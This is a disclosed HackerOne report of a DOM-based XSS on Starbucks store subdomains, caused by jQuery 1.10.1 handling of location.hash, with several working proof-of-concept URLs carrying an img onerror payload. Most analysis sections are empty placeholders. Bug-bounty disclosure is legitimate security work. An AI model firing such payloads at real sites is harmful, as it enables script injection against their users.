# Dom Based Xss DIV.innerHTML  parameters store.starbucks*

## Metadata
- **Source:** HackerOne
- **Report:** 188185 | https://hackerone.com/reports/188185
- **Submitted:** 2016-12-04
- **Reporter:** e3xpl0it
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hi! this subdomain store.starbucks* vulnerable to dom based xss. 
you are using the vulnerable library jQuery.V1_10_1	
parameters location.hash DIV.innerHTML .
Vulnerable all subdomains store.starbucks*
It works Chrome,and IE 11 the current version
POC
http://shop.starbucks.de/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi! this subdomain store.starbucks* vulnerable to dom based xss. 
you are using the vulnerable library jQuery.V1_10_1	
parameters location.hash DIV.innerHTML .
Vulnerable all subdomains store.starbucks*
It works Chrome,and IE 11 the current version
POC
http://shop.starbucks.de/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.ca/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.fr/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.co.uk/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>

</details>

---
*Analysed by Claude on 2026-05-24*
